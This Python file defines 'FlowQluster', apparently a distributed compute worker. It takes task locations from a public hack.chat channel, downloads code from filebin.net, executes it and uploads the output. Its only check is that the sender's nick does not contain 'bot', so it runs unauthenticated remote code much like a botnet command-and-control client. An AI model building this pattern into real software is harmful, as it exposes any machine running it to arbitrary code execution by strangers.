import asyncio
import requests
import websockets
import json
from concurrent.futures import ThreadPoolExecutor
from functools import partial
from base64 import b64decode, b64encode
from types import FunctionType
import traceback

instances = []


class FlowQluster:

    def __init__(self, channel):
        self.websocket = None
        self.name = None
        self.uri = "wss://hack.chat/chat-ws"
        self.base_url = f"https://filebin.net/"
        self.channel = channel
        self.busy = False
        self.loop = asyncio.get_event_loop()

    def download(self, location):
        url = f"https://filebin.net/{location}/input.json"
        return requests.get(url).json()

    def upload(self, location, data):
        url = f"https://filebin.net/{location}/{self.name}.json"
        requests.post(url, json=data)
        return f"{self.name}.json"

    def send(self, data):
        data = b64encode(data.encode()).decode()
        self.loop.run_until_complete(self.websocket.send(json.dumps({"cmd": "chat", "text": data})))

    def connect(self, name):
        self.name = name

        async def setup_connection():
            self.websocket = await websockets.connect(self.uri)
            conn = json.dumps({"cmd": "join", "channel": self.channel, "nick": self.name})
            await self.websocket.send(conn)

        self.loop.run_until_complete(setup_connection())

    async def task_executor(self, task):
        func = FunctionType(compile(task["code"], "<string>", "exec").co_consts[0], dict(), "task_func")
        args, kwargs = task["args"], task["kwargs"]

        function = partial(func, *args, **kwargs)
        with ThreadPoolExecutor(1, "AsyncExec") as executor:
            try:
                output = await self.loop.run_in_executor(executor, function)
            except Exception as e:
                output = "Exception Occurred:\n" + traceback.format_exc()
            return task["task_id"], output

    def tasks_handler(self, tasks):
        async def task_runner():
            co_tasks = list(map(self.task_executor, tasks))
            completed_tasks = await asyncio.gather(*co_tasks)
            output = {}
            for i in completed_tasks:
                output[i[0]] = i[1]
            return output

        return self.loop.run_until_complete(task_runner())

    def initialize_cluster(self):
        while True:
            raw_payload = self.loop.run_until_complete(self.websocket.recv())
            payload = json.loads(raw_payload)
            if payload["cmd"] == "chat" and "bot" not in payload["nick"]:
                print("Recieved Task from :" + payload["nick"])
                location = (b64decode(payload["text"]).decode())
                data = self.download(location)
                output_data = self.tasks_handler(data[self.name])
                output_location = self.upload(location, output_data)
                self.send(output_location)

    def shutdown(self):
        self.loop.run_until_complete(self.websocket.close())
